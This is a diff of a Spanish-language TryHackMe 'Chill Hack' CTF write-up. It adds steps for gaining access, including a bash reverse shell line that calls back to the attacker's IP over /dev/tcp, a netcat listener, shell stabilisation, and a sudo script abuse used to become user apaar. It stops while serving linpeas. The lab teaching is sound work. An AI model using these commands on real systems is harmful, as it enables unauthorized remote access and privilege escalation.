@@ -2,7 +2,7 @@
 title: Write-Up Chill Hack
 description: Write-Up sobre la máquina Chill Hack de TryHackMe
 published: false
-date: 2025-01-24T11:53:03.469Z
+date: 2025-01-24T14:41:46.406Z
 tags: tryhackme
 editor: markdown
 dateCreated: 2025-01-24T11:20:08.121Z
@@ -13,6 +13,8 @@ Bienvenido a mi Write Up de la máquina [Chill Hack de TryHackMe](https://tryhac
 ## Preparación
 Lo primero que haremos será abrir el archivo de VPN otorgado por TryHackme, y le haremos un ping a la ip de la máquina que nos han dado
 ![imagen_hacking_chill-hack_1ping.png](/imagen_hacking_chill-hack_1ping.png)
+> La IP de las máquinas son: KALI(10.9.3.9), THM(10.10.38.123)
+{.is-info}
 
 ## Escaneo y primer vistazo
 Una vez comprobado que no hay problemas con el ping, haremos un escaneo de puertos para observar que podemos ver. Para ello hacemos un 
@@ -72,3 +74,91 @@ dir
 get note.txt
 ```
 ![imagen_hacking_chill-hack_9get.png](/imagen_hacking_chill-hack_9get.png)
+
+Una vez descargado el archivo, vamos a comprobar lo que hay en el documento.
+![imagen_hacking_chill-hack_12note.png](/imagen_hacking_chill-hack_12note.png)
+El documento nos dice que un usuario llamado *Anurodh*, ha creado un filtro de comandos, esto está firmado por otro usuario llamado *Apaar*.
+
+Volvamos al HTTP e intentemos entrar, comienzando la fase de **Intrusión**
+## Intrusión
+Ahora nos queda intentar entrar en el equipo. Para ello se ha intentado varias formas, como puede ser:
+1. Subir un archivo con un script que contemple "sh -i >& /dev/tcp/10.9.3.9/9000 0>&1" y se ejecute
+2. Intentar introducir caracteres especiales entre el comando
+3. Dirigirnos directamente a la ruta de la ejecución del comando, que es lo que se hizo en este caso.
+
+Por lo tanto, dentro de la página web vamos a escribir:
+```bash
+/bin/bash -i >& /dev/tcp/10.9.3.9/9000 0>&1
+```
+
+Una vez escrito esto podemos observar como hemos entrado sin problema.
+![imagen_hacking_chill-hack_13intrusion.png](/imagen_hacking_chill-hack_13intrusion.png)
+> Recordad que debemos mantener una shell con "nc -lnvp 9000"
+{.is-info}
+
+Una vez tengamos acceso, podemos empezar a ejecutar comandos para intentar escalar privilegios.
+## Escalada de privilegios y búsqueda de flags
+### WWW-DATA
+Como podemos observar, somos el usuario www-data, usuario creado para interpretar website, recomiendo echar un ojo a el **directorio** en el que estamos, ya que nos será más util después.
+
+Lo primero que haremos será securizar la shell, para ello vamos a poner los siguientes comandos:
+```bash
+python3 -c "import pty;pty.spawn('/bin/bash')"
+```
+Tras esto hacemos<kbd>CTRL</kbd> + <kbd>Z</kbd>.
+Y escribimos los siguientes comandos:
+```
+stty raw -echo;
+export TERM=xterm
+```
+
+Ya tendremos la shell lista. Podemos analizar el contenido del index, para saber porque no podiamos escribir bien los comandos
+![imagen_hacking_chill-hack_15website.png](/imagen_hacking_chill-hack_15website.png)
+Como podemos observar, es debido a que hay una blacklist de comandos, para dificultarnos uso de la misma.
+Ahora lo que vamos a intentar es escalar privilegios como www-data, para ello podemos intentar los comandos:
+- id: Mirar los grupos a los que pertenece nuestro usuario.
+- sudo -l: Para comprobar los privilegios que tenemos.
+
+Si intentamos el id, no encontraremos nada importante, sin embargo con sudo -l, hemos encontrado que tenemos privilegios en un archivo llamado **.helpline.sh**, que está en la ruta **home** del usuario **apaar**
+![imagen_hacking_chill-hack_16privilegios.png](/imagen_hacking_chill-hack_16privilegios.png)
+
+Vamos a ver de que se trata este script.
+```
+cat /home/apaar/.helpline.sh
+```
+![imagen_hacking_chill-hack_17script.png](/imagen_hacking_chill-hack_17catscript.png)
+Como podemos observar es done nos pregunta un nombre, y después enviar un mensaje. Sin embargo este mensaje se envia a una terminal, por lo que podriamos intentar acceder al usuario apaar.
+> Esto es debido a que podemos ejecutar el comando como si fueramos apaar, como se vio anteriormente.
+{.is-info}
+
+Primero hacemos una prueba
+![imagen_hacking_chill_18scriptejecutado.png](/imagen_hacking_chill-hack_18scriptejecutado.png)
+
+Como podemos ver en la terminal, nos devuelve apaar, por lo que podriamos intentar acceder como este usuario, para poder tener una shell como apaar, vamos a poner en el apartado de mensaje /bin/bash.
+![imagen_hacking_chill-hack_19scriptdentro.png](/imagen_hacking_chill-hack_19scriptdentro.png)
+
+### Apaar
+Ya somos apaar, haremos lo mismo. Comprobaremos tanto *id* como *sudo -l*, lamentablemente no tenemos nada interante para continuar.
+Podemos comprobar si vemos algo en el home del usuario para ello hacemos
+```bash
+cd 
+ls
+```
+
+Podemos encontrar un txt llamado local, el cual si lo leemos con un cat, podremos obtener la primera flag.
+![imagen_hacking_chill-hack_20primeraflag.png](/imagen_hacking_chill-hack_20primeraflag.png)
+
+> En este punto yo estaba en punto muerto, por lo que se ha intentado continuar siguiendo algunos write-up y se recomienda el uso de Linpeas
+{.is-danger}
+
+Debido a que no tenemos forma ninguna de continuar, vamos a intentar usar una herramienta llamada Linpeas, que nos permitirá encontrar vulnerabilidades en el sistema.
+Nos descargamos linepas del github oficial: [Linpeas](https://github.com/peass-ng/PEASS-ng/tree/master). Nos vamos a descargar el [Linpeas.sh]()
+
+Una vez descargado, vamos a abrir un pequeño servicio web, para que el equipo de TryHackMe lo descargue.
+```python
+python -m http.server 8000
+```
+> Ubicar linpeas en la misma carpeta donde abris el servicio web.
+{.is-warning}
+
+![imagen_hacking_chill-hack_21pasarlinpeas.png](/imagen_hacking_chill-hack_21pasarlinpeas.png)
